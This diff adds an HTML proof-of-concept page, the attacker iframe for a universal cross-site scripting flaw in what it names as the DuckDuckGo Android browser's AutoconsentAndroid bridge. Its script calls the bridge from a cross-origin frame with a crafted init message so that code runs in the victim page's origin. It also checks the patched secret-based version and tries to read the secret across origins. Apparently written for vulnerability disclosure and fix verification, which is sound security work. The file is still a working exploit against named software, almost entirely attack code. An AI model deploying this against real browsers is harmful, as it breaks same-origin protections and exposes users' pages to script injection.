@@ -1,0 +1,148 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>UXSS PoC — Attacker iframe</title>
+  <style>
+    body { font-family: monospace; background: #1a1a1a; color: #ccc; padding: 20px; margin: 0; font-size: 0.85rem; }
+    h1   { color: #f44336; font-size: 1rem; }
+    .ok  { color: #4caf50; }
+    .err { color: #f44336; }
+    .info{ color: #2196f3; }
+    pre  { background: #111; padding: 10px; border-radius: 4px; word-wrap: break-word; white-space: pre-wrap; }
+    #log { list-style: none; padding: 0; margin: 0; }
+    #log li { margin: 3px 0; }
+  </style>
+</head>
+<body>
+
+  <h1>☠️  UXSS PoC — Attacker iframe</h1>
+  <p class="info">
+    This page is loaded as a <strong>cross-origin iframe</strong> inside victim.html.
+    It calls <code>AutoconsentAndroid.process()</code> from a cross-origin context.
+    Android does <em>not</em> enforce SOP on <code>@JavascriptInterface</code> calls.
+  </p>
+
+  <ul id="log"></ul>
+
+  <script>
+    /* ====================================================================
+       UXSS Proof-of-Concept — Attacker's cross-origin iframe
+
+       Vulnerability:  AutoconsentInterface (pre-fix)
+       Bridge method:  AutoconsentAndroid.process(message)     ← one arg, no secret
+       Effect:         Android calls webView.evaluateJavascript() in the
+                       MAIN FRAME's JS context, giving us code execution in
+                       the victim page's origin despite the Same-Origin Policy.
+
+       Fixed version:  AutoconsentAndroid.process(message, secret)   ← two args
+                       Secret is a per-session UUID stored in
+                       window.autoconsentAndroidSecret on the main frame only.
+                       Cross-origin iframes cannot read that variable (SOP).
+       ==================================================================== */
+
+    function log(msg, cls) {
+      var li = document.createElement('li');
+      li.className = cls || '';
+      li.innerHTML = '[' + new Date().toISOString() + '] ' + msg;
+      document.getElementById('log').appendChild(li);
+      /* Also report status to victim page for UI feedback. */
+      window.parent.postMessage({ pocType: 'attacker-status', text: msg }, '*');
+    }
+
+    /* ── Phase 1: Verify we are inside the right browser ─────────────── */
+    log('Attacker iframe loaded. Checking for AutoconsentAndroid interface…', 'info');
+
+    setTimeout(function () {
+
+      if (typeof AutoconsentAndroid === 'undefined') {
+        log(
+          '<span class="err">AutoconsentAndroid NOT found.</span> ' +
+          'Are you running this in the <strong>DuckDuckGo Android browser</strong> ' +
+          'with the autoconsent feature enabled? ' +
+          'The interface is only injected by the app — it will not appear in desktop browsers.',
+          'err'
+        );
+        log('Hint: enable "Auto-dismiss cookie pop-ups" in DDG Settings → Privacy → Manage notifications.', 'info');
+        return;
+      }
+
+      log('<span class="ok">AutoconsentAndroid interface FOUND</span> — bridge is accessible from this cross-origin iframe!', 'ok');
+
+      /* ── Phase 2: Determine the victim URL ───────────────────────────
+         document.referrer gives us the URL of the parent page (victim.html).
+         In practice an attacker would target specific known URLs; here we
+         use the referrer so the init message looks legitimate to the handler. */
+      var victimUrl = document.referrer || 'http://localhost:8080/victim.html';
+      log('Victim URL (from document.referrer): ' + victimUrl, 'info');
+
+      /* ── Phase 3: Fire the UXSS attack ──────────────────────────────
+         We call AutoconsentAndroid.process() with a crafted "init" message.
+         On the VULNERABLE (pre-fix) version this method takes ONE argument:
+           process(message: String)
+         On the FIXED version it takes TWO:
+           process(message: String, secret: String)
+         and rejects any call where the secret doesn't match the per-session UUID.
+
+         We attempt the vulnerable one-argument call first, then a two-argument
+         call with an empty secret (which the fixed version will also reject). */
+
+      var initPayload = JSON.stringify({
+        type: 'init',
+        url:  victimUrl
+      });
+
+      log('Sending crafted init message: <code>' + initPayload + '</code>', 'info');
+
+      /* ── VULNERABLE PATH (pre-fix): one argument, no secret required ── */
+      try {
+        AutoconsentAndroid.process(initPayload);
+        log(
+          '<span class="ok">process(message) called successfully with ONE argument!</span><br>' +
+          'On the vulnerable build this triggers InitMessageHandlerPlugin, which calls<br>' +
+          '<code>webView.evaluateJavascript("javascript:window.autoconsentMessageCallback(initResp, origin)", null)</code><br>' +
+          'in the <strong>main frame\'s JS context</strong> — i.e., victim.html\'s origin.<br>' +
+          'Watch victim.html\'s evidence log for confirmation.',
+          'ok'
+        );
+      } catch (e) {
+        log('process(message) one-arg call threw: ' + e.message, 'err');
+      }
+
+      /* ── FIXED PATH: same call with empty secret (will be rejected) ── */
+      setTimeout(function () {
+        try {
+          AutoconsentAndroid.process(initPayload, '');   /* empty secret → rejected */
+          log(
+            'process(message, "") called (two args, empty secret). ' +
+            'On the fixed build this is silently dropped by the secret check. ' +
+            'On the vulnerable build (single-param method) this is also a no-op ' +
+            'because the method signature doesn\'t match two args.',
+            'info'
+          );
+        } catch (e) {
+          log('process(message, "") threw: ' + e.message, 'err');
+        }
+
+        /* Attempt to read the secret from the main frame — this MUST fail (SOP). */
+        log('Attempting to read window.top.autoconsentAndroidSecret from cross-origin frame…', 'info');
+        try {
+          /* On same-origin this would work; cross-origin throws DOMException. */
+          var secret = window.top.autoconsentAndroidSecret;
+          if (secret) {
+            log('<span class="err">UNEXPECTED: read secret from main frame: ' + secret + '</span>', 'err');
+          } else {
+            log('window.top.autoconsentAndroidSecret = undefined (SOP protecting main frame — expected).', 'ok');
+          }
+        } catch (e) {
+          log('Cross-origin read blocked by SOP as expected: ' + e.message + ' ✔', 'ok');
+        }
+
+        log('Attack sequence complete. Check victim.html for the UXSS evidence log.', 'info');
+      }, 300);
+
+    }, 500);   /* 500 ms delay — gives victim.html time to arm its interceptor first */
+  </script>
+
+</body>
+</html>
